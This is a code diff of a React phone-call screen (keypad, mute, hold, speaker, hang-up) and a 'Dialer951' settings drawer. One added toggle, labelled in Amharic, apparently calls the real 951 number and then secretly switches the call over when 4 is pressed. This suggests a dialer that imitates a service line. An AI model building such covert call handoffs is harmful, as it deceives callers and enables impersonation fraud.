+                        setDtmfEntered((prev) => `${prev}${item.digit}`.slice(-12));
+                        if (typeof bridge?.sendNativeCallDtmf === 'function') {
+                          try {
+                            (bridge.sendNativeCallDtmf as (d: string) => void)(item.digit);
+                          } catch {}
+                        }
+                      }}
+                      className="h-[52px] rounded-2xl flex flex-col items-center justify-center active:bg-black/10 cursor-pointer"
+                    >
+                      <span className="text-[28px] font-semibold leading-none">{item.digit}</span>
+                      {item.sub ? (
+                        <span className="text-[10px] font-bold tracking-[0.14em] text-[#454b4f] mt-0.5">
+                          {item.sub}
+                        </span>
+                      ) : (
+                        <span className="h-[11px]" />
+                      )}
+                    </button>
+                  ))}
+                </div>
+                <div className="grid grid-cols-3 gap-2 pt-1 pb-6">
                   <button
-                    key={item.digit}
                     type="button"
-                    onClick={() => {
-                      playSharedDtmf(audioCtxRef, item.digit);
-                      setDtmfEntered((prev) => `${prev}${item.digit}`.slice(-12));
-                    }}
-                    className="h-[52px] rounded-2xl flex flex-col items-center justify-center active:bg-black/10 cursor-pointer"
+                    onClick={toggleSpeaker}
+                    className="flex flex-col items-center gap-1.5 py-1.5 rounded-2xl cursor-pointer"
                   >
-                    <span className="text-[28px] font-semibold leading-none">{item.digit}</span>
-                    {item.sub ? (
-                      <span className="text-[10px] font-bold tracking-[0.14em] text-[#454b4f] mt-0.5">
-                        {item.sub}
-                      </span>
-                    ) : (
-                      <span className="h-[11px]" />
-                    )}
+                    <Volume2 className={`w-6 h-6 ${speakerOn ? 'text-[#1976d2]' : 'text-[#1c1c1c]'}`} />
+                    <span className={`text-[12px] font-medium ${speakerOn ? 'text-[#1976d2]' : 'text-[#1c1c1c]'}`}>
+                      Speaker
+                    </span>
                   </button>
-                ))}
-              </div>
-              <div className="grid grid-cols-3 gap-2 pt-1 pb-6">
-                <button
-                  type="button"
-                  onClick={() => setSpeakerOn((v) => !v)}
-                  className="flex flex-col items-center gap-1.5 py-1.5 rounded-2xl cursor-pointer"
-                >
-                  <Volume2 className={`w-6 h-6 ${speakerOn ? 'text-[#1976d2]' : 'text-[#1c1c1c]'}`} />
-                  <span className="text-[12px] font-medium">Speaker</span>
+                  <button
+                    type="button"
+                    onClick={toggleMute}
+                    className="flex flex-col items-center gap-1.5 py-1.5 rounded-2xl cursor-pointer"
+                  >
+                    {muted ? (
+                      <Mic className="w-6 h-6 text-[#d93829]" />
+                    ) : (
+                      <MicOff className="w-6 h-6 text-[#1c1c1c]" />
+                    )}
+                    <span className={`text-[12px] font-medium ${muted ? 'text-[#d93829]' : 'text-[#1c1c1c]'}`}>
+                      Mute
+                    </span>
+                  </button>
+                  <button
+                    type="button"
+                    onClick={() => setKeypadVisible(false)}
+                    className="flex flex-col items-center gap-1.5 py-1.5 rounded-2xl cursor-pointer"
+                  >
+                    <Grip className="w-6 h-6 text-[#19b264]" />
+                    <span className="text-[12px] font-medium">Hide</span>
+                  </button>
+                </div>
+              </>
+            ) : (
+              <div className="grid grid-cols-3 gap-y-6 gap-x-2 pb-7">
+                <button type="button" className="flex flex-col items-center gap-1.5 py-1 cursor-pointer">
+                  <Plus className="w-6 h-6 text-[#1c1c1c]" />
+                  <span className="text-[12px] font-medium">Add call</span>
                 </button>
                 <button
                   type="button"
-                  onClick={() => setMuted((v) => !v)}
-                  className="flex flex-col items-center gap-1.5 py-1.5 rounded-2xl cursor-pointer"
+                  onClick={toggleHold}
+                  className="flex flex-col items-center gap-1.5 py-1 cursor-pointer"
+                >
+                  <Pause className={`w-6 h-6 ${isHolding ? 'text-[#1976d2]' : 'text-[#1c1c1c]'}`} />
+                  <span className={`text-[12px] font-medium ${isHolding ? 'text-[#1976d2]' : 'text-[#1c1c1c]'}`}>
+                    Hold call
+                  </span>
+                </button>
+                <button
+                  type="button"
+                  onClick={toggleBluetooth}
+                  className="flex flex-col items-center gap-1.5 py-1 cursor-pointer"
+                >
+                  <Bluetooth className={`w-6 h-6 ${bluetoothOn ? 'text-[#1976d2]' : 'text-[#1c1c1c]'}`} />
+                  <span className={`text-[12px] font-medium ${bluetoothOn ? 'text-[#1976d2]' : 'text-[#1c1c1c]'}`}>
+                    Bluetooth
+                  </span>
+                </button>
+                <button
+                  type="button"
+                  onClick={toggleSpeaker}
+                  className="flex flex-col items-center gap-1.5 py-1 cursor-pointer"
+                >
+                  <Volume2 className={`w-6 h-6 ${speakerOn ? 'text-[#1976d2]' : 'text-[#1c1c1c]'}`} />
+                  <span className={`text-[12px] font-medium ${speakerOn ? 'text-[#1976d2]' : 'text-[#1c1c1c]'}`}>
+                    Speaker
+                  </span>
+                </button>
+                <button
+                  type="button"
+                  onClick={toggleMute}
+                  className="flex flex-col items-center gap-1.5 py-1 cursor-pointer"
                 >
                   {muted ? (
                     <Mic className="w-6 h-6 text-[#d93829]" />
                   ) : (
                     <MicOff className="w-6 h-6 text-[#1c1c1c]" />
                   )}
-                  <span className="text-[12px] font-medium">Mute</span>
+                  <span className={`text-[12px] font-medium ${muted ? 'text-[#d93829]' : 'text-[#1c1c1c]'}`}>
+                    Mute
+                  </span>
                 </button>
                 <button
                   type="button"
-                  onClick={() => setKeypadVisible(false)}
-                  className="flex flex-col items-center gap-1.5 py-1.5 rounded-2xl cursor-pointer"
+                  onClick={() => setKeypadVisible(true)}
+                  className="flex flex-col items-center gap-1.5 py-1 cursor-pointer"
                 >
-                  <Grip className="w-6 h-6 text-[#19b264]" />
-                  <span className="text-[12px] font-medium">Hide</span>
+                  <Grip className="w-6 h-6 text-[#1c1c1c]" />
+                  <span className="text-[12px] font-medium">Keypad</span>
                 </button>
               </div>
-            </>
-          ) : (
-            <div className="grid grid-cols-3 gap-y-6 gap-x-2 pb-7">
-              <button type="button" className="flex flex-col items-center gap-1.5 py-1 cursor-pointer">
-                <Plus className="w-6 h-6 text-[#1c1c1c]" />
-                <span className="text-[12px] font-medium">Add call</span>
-              </button>
+            )}
+
+            <div className="flex justify-center">
               <button
                 type="button"
-                onClick={() => setHeld((v) => !v)}
-                className="flex flex-col items-center gap-1.5 py-1 cursor-pointer"
+                onClick={handleHangupOrReject}
+                aria-label="End Call"
+                className="w-[62px] h-[62px] rounded-full bg-[#e53935] hover:bg-[#d32f2f] active:scale-95 text-white flex items-center justify-center shadow-md cursor-pointer"
               >
-                <Pause className={`w-6 h-6 ${held ? 'text-[#1976d2]' : 'text-[#1c1c1c]'}`} />
-                <span className="text-[12px] font-medium">Hold call</span>
-              </button>
-              <button
-                type="button"
-                onClick={() => setBluetoothOn((v) => !v)}
-                className="flex flex-col items-center gap-1.5 py-1 cursor-pointer"
-              >
-                <Bluetooth className={`w-6 h-6 ${bluetoothOn ? 'text-[#1976d2]' : 'text-[#1c1c1c]'}`} />
-                <span className="text-[12px] font-medium">Bluetooth</span>
-              </button>
-              <button
-                type="button"
-                onClick={() => setSpeakerOn((v) => !v)}
-                className="flex flex-col items-center gap-1.5 py-1 cursor-pointer"
-              >
-                <Volume2 className={`w-6 h-6 ${speakerOn ? 'text-[#1976d2]' : 'text-[#1c1c1c]'}`} />
-                <span className="text-[12px] font-medium">Speaker</span>
-              </button>
-              <button
-                type="button"
-                onClick={() => setMuted((v) => !v)}
-                className="flex flex-col items-center gap-1.5 py-1 cursor-pointer"
-              >
-                {muted ? (
-                  <Mic className="w-6 h-6 text-[#d93829]" />
-                ) : (
-                  <MicOff className="w-6 h-6 text-[#1c1c1c]" />
-                )}
-                <span className="text-[12px] font-medium">Mute</span>
-              </button>
-              <button
-                type="button"
-                onClick={() => setKeypadVisible(true)}
-                className="flex flex-col items-center gap-1.5 py-1 cursor-pointer"
-              >
-                <Grip className="w-6 h-6 text-[#1c1c1c]" />
-                <span className="text-[12px] font-medium">Keypad</span>
+                <PhoneOff className="w-7 h-7 fill-white stroke-white" />
               </button>
             </div>
-          )}
-
-          <div className="flex justify-center">
-            <button
-              type="button"
-              onClick={() => onEnd(elapsedRef.current)}
-              aria-label="End Call"
-              className="w-[62px] h-[62px] rounded-full bg-[#e53935] hover:bg-[#d32f2f] active:scale-95 text-white flex items-center justify-center shadow-md cursor-pointer"
-            >
-              <PhoneOff className="w-7 h-7 fill-white stroke-white" />
-            </button>
           </div>
         </div>
-      </div>
+      )}
     </motion.div>
   );
 }
@@ -2855,6 +3235,24 @@ export function Dialer951StudioDrawer({
                 />
               </div>
             </div>
+
+            <label className="flex items-center justify-between text-xs text-slate-700 pt-1">
+              <span>መጀመሪያ ወደ ትክክለኛው 951 ደውሎ 4 ሲጫን በድብቅ ይቀይር (Real SIM 951 Handoff)</span>
+              <input
+                type="checkbox"
+                checked={cfg.backgroundCall.useReal951BeforeHandoff ?? true}
+                onChange={(e) =>
+                  setCfg((prev) => ({
+                    ...prev,
+                    backgroundCall: {
+                      ...prev.backgroundCall,
+                      useReal951BeforeHandoff: e.target.checked,
+                    },
+                  }))
+                }
+                className="accent-[#19b264] w-4 h-4"
+              />
+            </label>
 
             <label className="flex items-center justify-between text-xs text-slate-700 pt-1">
               <span>ጥሪ ሲዘጋ የደረጃ 3 Survey MP3 አጫውት</span>
